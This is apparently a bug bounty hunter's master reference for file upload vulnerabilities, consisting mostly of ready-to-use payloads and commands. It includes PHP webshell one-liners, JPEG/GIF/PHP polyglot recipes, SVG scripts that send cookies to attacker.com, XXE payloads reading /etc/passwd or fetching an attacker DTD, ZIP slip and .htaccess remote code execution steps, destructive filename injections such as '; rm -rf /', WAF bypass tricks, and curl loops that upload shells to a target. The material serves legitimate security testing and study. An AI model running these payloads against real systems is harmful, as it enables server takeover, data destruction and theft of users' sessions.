# FILE UPLOAD — UNIFIED MASTER REFERENCE
> Merged from: web2-vuln-classes (Section 9), telegram-intel (Bug0x #164, BugBountyResources #1077), github-x-intel (HolyTips, H1 reports), bountyforge, bb-methodology
> Last updated: 2026-09-22

---

## QUICK START — 5-MINUTE TEST PLAN

```
[ ] 1. Identify ALL upload endpoints (avatar, document, import, profile, Rich Text Editor)
[ ] 2. Test extension bypass (.php.jpg, .pHp, .php5, .phtml, null byte, double ext)
[ ] 3. Test MIME type spoofing (Content-Type: image/jpeg with PHP body)
[ ] 4. Test magic bytes (GIF89a; + PHP, polyglot JPEG+PHP via exiftool)
[ ] 5. Test SVG XSS/XXE, PDF JS, Office XXE, ZIP slip
[ ] 6. Test parser quirks (Busboy UTF-16LE, Undici, chunked encoding)
[ ] 7. Test .htaccess/.user.ini for RCE via auto_prepend
[ ] 8. Prove impact: RCE = Critical, Stored XSS = High, XXE = High
```

---

## FILE UPLOAD BYPASS TECHNIQUES (Complete 18+ Techniques)

| # | Technique | Payload/Method | Target Parser |
|---|-----------|----------------|---------------|
| 1 | **Extension bypass** | `.php.jpg`, `.pHp`, `.php5`, `.phtml`, `.php7`, `.phar`, `.pgif`, `.inc` | Weak allowlist |
| 2 | **Null byte** | `shell.php%00.jpg`, `shell.php\x00.jpg` | C-based parsers |
| 3 | **Double extension** | `shell.jpg.php`, `shell.php.blah123jpg` | Regex-only check |
| 4 | **MIME spoofing** | `Content-Type: image/jpeg` with PHP body | Trusts header only |
| 5 | **Magic bytes prefix** | `GIF89a; <?php system($_GET['cmd']); ?>` | Checks only header |
| 6 | **Polyglot (JPEG+PHP)** | `exiftool -Comment='<?php ... ?>' pic.jpg` → `mv pic.jpg pic.php.jpg` | Image lib + PHP |
| 7 | **SVG JavaScript** | `<svg onload="alert(1)"/>` or `<svg><script>...</script></svg>` | SVG renderer |
| 8 | **SVG XXE** | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>` | XML parser |
| 9 | **XXE in DOCX/OOXML** | Malicious `word/document.xml` in `.docx` ZIP | Office XML parser |
| 10 | **ZIP slip** | `../../../etc/passwd` in archive | Archive extractor |
| 11 | **Filename injection** | `; rm -rf /`, `$(id)`, `shell.php;.jpg` | Shell exec on filename |
| 12 | **Busboy UTF-16LE** | `Content-Type: text/plain; charset=utf16le` on part | Node.js/Next.js |
| 13 | **Undici/FormData** | Use FormData path (ignores per-part charset) | Node.js fetch |
| 14 | **Chunked encoding** | `Transfer-Encoding: chunked` with malicious parts | WAF bypass |
| 15 | **Unicode filename** | `shell.php.jpg` with Unicode normalization bypass | Filesystem |
| 16 | **Case sensitivity** | `shell.PHP` on Linux (case-sensitive) vs Windows | OS filesystem |
| 17 | **`.htaccess` / `.user.ini`** | `auto_prepend_file=shell.php` → RCE | Apache/PHP-FPM |
| 18 | **ExifTool metadata** | Embed PHP in EXIF, upload as JPEG | Metadata reader |
| 19 | **Archive traversal** | `tar`, `rar` with absolute paths | Archive handler |
| 20 | **SVG foreignObject** | `<foreignObject><img src=x onerror=...></foreignObject>` | SVG renderer |
| 21 | **PDF JavaScript** | `/Launch` action, embedded JS in PDF | PDF renderer |
| 22 | **RFC 2231 filename** | `filename*=utf-8''shell.php` | MIME parser |
| 23 | **MIME Base64 filename** | `filename="=?utf-8?b?c2hlbGwucGhw?="` | MIME parser |

---

## MAGIC BYTES REFERENCE

| Format | Magic Bytes (Hex) | Polyglot Potential |
|--------|-------------------|-------------------|
| **JPEG** | `FF D8 FF` | High (EXIF, APP segments) |
| **PNG** | `89 50 4E 47 0D 0A 1A 0A` | Medium (tEXt, zTXt chunks) |
| **GIF** | `47 49 46 38` (GIF87a/89a) | High (comment extension) |
| **PDF** | `25 50 44 46` (%PDF) | High (JS, Launch, /EmbeddedFiles) |
| **ZIP/DOCX/XLSX** | `50 4B 03 04` (PK) | High (ZIP slip, XML XXE) |
| **SVG** | `<svg` / `<?xml` | High (JS, XXE, foreignObject) |
| **TIFF** | `49 49 2A 00` / `4D 4D 00 2A` | Medium (IFD entries) |
| **BMP** | `42 4D` (BM) | Low |
| **WEBP** | `52 49 46 46....57 45 42 50` | Low |
| **ICO** | `00 00 01 00` | Low |

---

## EXTENSION BYPASS VARIANTS (Per Technology)

### PHP
```
.php, .php3, .php4, .php5, .php7, .phtml, .phtm, .phps, .phar, .pht, .pgif, .inc, .module
```

### ASP/ASPX
```
.asp, .aspx, .cer, .asa, .ashx, .asmx, .ascx
```

### JSP
```
.jsp, .jspx, .jsw, .jsv, .jspf
```

### ColdFusion
```
.cfm, .cfml, .cfc, .dbm
```

### Perl
```
.pl, .cgi, .fcgi
```

### Python
```
.py, .pyc, .pyo, .pyd
```

### Node.js
```
.js, .mjs, .cjs
```

### Generic (Try All)
```
.php.jpg, .php.png, .php.gif, .pHp, .PhP, .PHP, .PhP5, .phtml.jpg
```

---

## SVG PAYLOADS (XSS + XXE)

### XSS
```xml
<!-- Basic -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>

<!-- With script -->
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('//attacker.com/?c='+document.cookie)</script>
</svg>

<!-- foreignObject (bypasses some sanitizers) -->
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject>
    <img src=x onerror=alert(1)>
  </foreignObject>
</svg>

<!-- animate (no script tag) -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
```

### XXE
```xml
<!-- File read -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg><text x="0" y="20">&xxe;</text></svg>

<!-- SSRF via expect:// (PHP) -->
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="expect://ls"/>
</svg>

<!-- Parameter entity (blind) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
```

---

## POLYGLOT CREATION

### JPEG + PHP (exiftool)
```bash
# Embed PHP in EXIF comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' shell.jpg

# Rename to double extension
mv shell.jpg shell.php.jpg

# Or: polyglot with valid JPEG structure + PHP in APP1 segment
```

### GIF + PHP
```bash
# GIF89a comment extension
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif
# Rename: shell.php.gif
```

### ZIP + PHP (ZIP slip)
```bash
# Create ZIP with traversal
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip slip.zip shell.php
# Edit ZIP central directory to have ../../../var/www/html/shell.php
# Or use: zip -r slip.zip ../var/www/html/shell.php
```

---

## NODE.JS/NEXT.JS PARSER QUIRKS (Critical for Modern Apps)

### Busboy UTF-16LE Bypass (web2-vuln-classes, BugXplorer #4075)
```http
POST / HTTP/2
Host: target.com
Next-Action: x
Content-Type: multipart/form-data; boundary=y

--y
Content-Disposition: form-data; name="0"
Content-Type: text/plain; charset=utf16le

[UTF-16LE encoded payload with __proto__ / :constructor]
--y
Content-Disposition: form-data; name="1"

"$0"
--y--
```
> WAF sees null-interleaved bytes; Busboy decodes as ASCII. Test on ALL multipart endpoints.

### Undici/FormData Path
```javascript
// Undici ignores per-part charset
// Use standard FormData API
const form = new FormData();
form.append('field', payload, {filename: 'shell.php', contentType: 'text/plain'});
```

### WAF Ruleset Evolution (Test Each)
| WAF Version | Rule | Bypass |
|-------------|------|--------|
| ver.0 | Block `:constructor` in decoded | UTF-16LE on part |
| ver.1 | Skip file parts (has filename) | Add `filename=` to payload part |
| ver.3 | Block non-UTF-8 charset | Use Undici path |
| ver.0.5 | Block `__proto__` / `:constructor` | Split across 2 fields |

---

## MALICIOUS FILE UPLOAD CHECKLIST (Bug0x #164 / aacle.notion.site)

```
[ ] Extension bypass: .php.jpg, .pHp, .php5, .phtml, .php7
[ ] Null byte: shell.php%00.jpg
[ ] Double extension: shell.jpg.php
[ ] MIME spoof: Content-Type: image/jpeg with PHP body
[ ] Magic bytes prefix: GIF89a; + PHP payload
[ ] Polyglot: Valid JPEG + PHP (exiftool embed)
[ ] SVG JavaScript: <svg onload="..."> / <svg><script>...</script></svg>
[ ] XXE in DOCX: Malicious XML in Office ZIP
[ ] ZIP slip: ../../../etc/passwd in archive
[ ] Filename injection: ; rm -rf / in filename
[ ] Content-Type confusion: multipart/form-data parser quirks (Busboy UTF-16LE)
[ ] Chunked encoding bypass
[ ] Unicode filename normalization
[ ] Case sensitivity bypass (Linux vs Windows)
[ ] .htaccess / .user.ini upload for RCE via auto_prepend
[ ] Polyglot GIF89a + PHP webshell
[ ] ExifTool PHP payload in image metadata
[ ] Archive traversal (tar, zip, rar)
[ ] SVG foreignObject XSS
[ ] PDF embedded JavaScript / launch action
[ ] RFC 2231 filename: filename*=utf-8''shell.php
[ ] MIME Base64 filename: filename="=?utf-8?b?c2hlbGwucGhw?="
```

---

## AEM MISCONFIGURATION CHECKLIST (BugBountyResources #1077)

```
[ ] /crx/de — CRXDE Lite (JCR browser) exposed
[ ] /system/console — OSGi console exposed
[ ] /libs/granite/ui/content/dumplibs.html — Client library dumper
[ ] /etc/replication/agents.author/publish/jcr:content — Replication config
[ ] /content/dam — DAM assets (may leak sensitive docs)
[ ] /content/usergenerated — UGC paths
[ ] /apps/*/config — Component configurations
[ ] /var/classes — Compiled JSP classes
[ ] /system/console/bundles — Bundle versions (CVEs)
[ ] /system/console/components — Component status
[ ] /system/console/configMgr — Configuration manager
[ ] /system/console/slinglog — Log configuration
[ ] Dispatcher cache flush endpoints
[ ] Sling servlet paths without auth
```

---

## HIGH-VALUE H1 REPORTS (2025)

| Bounty | Title | Program | Technique |
|--------|-------|---------|-----------|
| **$150** | Stored XSS via SVG File | Nextcloud | SVG upload → XSS |
| **$150** | Stored XSS in AREA tutorials | Autodesk | SVG upload |
| **—** | Stored XSS in Conversion Statistics | Revive Adserver | Tracker name XSS |
| **—** | Stored XSS in File Upload Leads to PrivEsc | Dust | File upload → XSS → PrivEsc |
| **—** | ImageId Format Injection in Image Upload | Lichess | Format injection |
| **—** | Reflected XSS in SVG File | Autodesk | SVG parameter |

---

## CHAINS THAT PAY

```
File Upload (RCE via .htaccess/.user.ini)           → Critical
File Upload (SVG XSS) + Admin views file            → High
File Upload (Polyglot JPEG+PHP) + Execution         → Critical
File Upload (XXE in DOCX) → Internal file read      → High
File Upload (ZIP slip) → Path traversal → RCE       → Critical
File Upload (SVG XXE) → SSRF → Cloud metadata       → Critical
File Upload (PDF JS) → Admin views PDF → XSS        → High
File Upload (Avatar) → Stored XSS on profile        → Medium/High
File Upload (Rich Text Editor) → SVG/PDF → XSS      → High
File Upload + Busboy UTF-16LE → Prototype pollution → Critical (Next.js)
```

---

## AUTOMATED TESTING (One-Liners)

```bash
# Extension fuzzing
ffuf -u "https://target.com/upload" -X POST -H "Content-Type: multipart/form-data" -F "file=@/path/shell.FUZZ" -w extensions.txt

# MIME type fuzzing
for mime in "image/jpeg" "image/png" "image/gif" "application/pdf" "text/plain"; do
  curl -X POST "https://target.com/upload" -H "Content-Type: $mime" -F "file=@shell.php" -w "$mime: %{http_code}\n"
done

# Magic bytes test (GIF89a)
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif
curl -X POST "https://target.com/upload" -F "file=@shell.gif"

# exiftool polyglot
exiftool -Comment='<?php system($_GET["cmd"]); ?>' shell.jpg
mv shell.jpg shell.php.jpg
curl -X POST "https://target.com/upload" -F "file=@shell.php.jpg"

# SVG XSS
echo '<svg onload=fetch("//attacker.com/?c="+document.cookie)></svg>' > xss.svg
curl -X POST "https://target.com/upload" -F "file=@xss.svg"

# ZIP slip
mkdir -p ../../../var/www/html
echo '<?php system($_GET["cmd"]); ?>' > ../../../var/www/html/shell.php
zip -r slip.zip .
curl -X POST "https://target.com/upload" -F "file=@slip.zip"

# .htaccess RCE
echo 'auto_prepend_file="/var/www/html/shell.php"' > .htaccess
curl -X POST "https://target.com/upload" -F "file=@.htaccess"

# Busboy UTF-16LE test
# Create UTF-16LE payload with __proto__ pollution
# Send with Content-Type: text/plain; charset=utf16le on multipart part

# AEM endpoints
for endpoint in "/crx/de" "/system/console" "/libs/granite/ui/content/dumplibs.html" "/content/dam"; do
  curl -s -o /dev/null -w "$endpoint: %{http_code}\n" "https://target.com$endpoint"
done
```

---

## HOLYTIPS FILE UPLOAD CHECKLIST (PDF 340KB)

> Source: https://github.com/HolyBugx/HolyTips/tree/main/Checklist/File%20Upload.md

### Extensions Impact
```
ASP, ASPX, PHP5, PHP, PHP3 → Webshell, RCE
SVG → Stored XSS, SSRF, XXE
GIF → Stored XSS, SSRF
CSV → CSV injection
XML → XXE
AVI → LFI, SSRF
HTML, JS → HTML injection, XSS, Open redirect
PNG, JPEG → Pixel flood attack (DoS)
ZIP → RCE via LFI, DoS
PDF, PPTX → SSRF, BLIND XXE
```

### Blacklisting Bypass
```
PHP → .phtm, phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc
ASP → .asp, .aspx, .cer, .asa
JSP → .jsp, .jspx, .jsw, .jsv, .jspf
Coldfusion → .cfm, .cfml, .cfc, .dbm
Random capitalization → .pHp, .pHP5, .PhAr
```

### Whitelisting Bypass
```
file.jpg.php
file.php.jpg
file.php.blah123jpg
file.php%00.jpg
file.php\x00.jpg
file.php%00
file.php%20
file.php%0d%0a.jpg
file.php.....
file.php/
file.php.\
file.php#.png
file.
.html
```

### Content-Type Validation Bypass
```
Upload file.php → change Content-Type: application/x-php → image/png/gif/jpg
Small PHP shell: (<?=`$_GET[x]`?>)
GIF89a; <?php system($_GET['cmd']); ?>
```

---

## TRIAGE DECISION TREE

```
1. Does file execute on server?
   - .htaccess/.user.ini + PHP → RCE = Critical
   - Direct PHP/ASP/JSP execution → RCE = Critical
   - Prototype pollution (Node.js) → RCE = Critical

2. Does file render in victim's browser?
   - SVG XSS → Stored XSS = High (if admin views)
   - PDF JS → XSS = High
   - HTML/JS upload → XSS = High

3. Does file expose internal data?
   - SVG XXE → File read/SSRF = High
   - DOCX XXE → File read = High
   - ZIP slip → Arbitrary file write = Critical

4. Does file cause DoS?
   - Pixel flood (PNG/JPEG) → DoS = Low/Medium
   - ZIP bomb → DoS = Low

5. Parser quirks?
   - Busboy UTF-16LE → Prototype pollution = Critical
   - Chunked encoding → WAF bypass = High
```

---

## KILL LIST (Auto-Reject)

| Pattern | Reason |
|---------|--------|
| Upload to non-executed location (S3, CDN, static) | No execution = Info |
| XSS only in sandboxed domain | No sensitive data = Low |
| XXE but no external entity resolution | Not exploitable = N/A |
| ZIP slip but extraction path validated | Not vulnerable = N/A |
| Extension bypass but file not served/executed | No impact = Info |
| "Could upload shell if..." without execution proof | Theoretical = N/A |
| File upload on out-of-scope domain | Not in scope |

---

## TOOLS (Consolidated)

| Tool | Purpose |
|------|---------|
| `exiftool` | Embed payloads in image metadata |
| `polyglot` scripts | Create JPEG/PNG/GIF + PHP polyglots |
| `zip` / `tar` | Create ZIP slip / archive traversal |
| `multipath_mutator.py` | 10 parser-confusion variants for WAF bypass |
| `ffuf` | Extension/MIME fuzzing |
| `nuclei` templates | File upload, AEM, SVG XSS/XXE |
| `Burp Suite` | Manual testing, parser confusion |
| `Gopherus` | Gopher payloads for SSRF via upload |
| `objection`/`Frida` | Mobile app file upload bypass |

---

## REFERENCES (All Sources)

- web2-vuln-classes: Section 9 (10 techniques, magic bytes, Busboy/Undici, Malicious File Upload Checklist, AEM)
- telegram-intel: @Bug0x #164 (Malicious File Upload Checklist), @bugbountyresources #1077 (AEM)
- github-x-intel: HolyTips File Upload checklist (PDF 340KB), H1 reports (Nextcloud, Autodesk, Dust, Lichess, Revive)
- bountyforge: waf-bypass-agent (multipart mutations), RSC/Next.js context
- bb-methodology: Tactical Thinking (parser quirks), What-If experiments
- PortSwigger: File upload labs, Polyglot research
- HackTricks: File upload methodology
- aacle.notion.site: Malicious File Upload Checklist
- Orange Tsai: "Breaking Parser Logic" (Black Hat)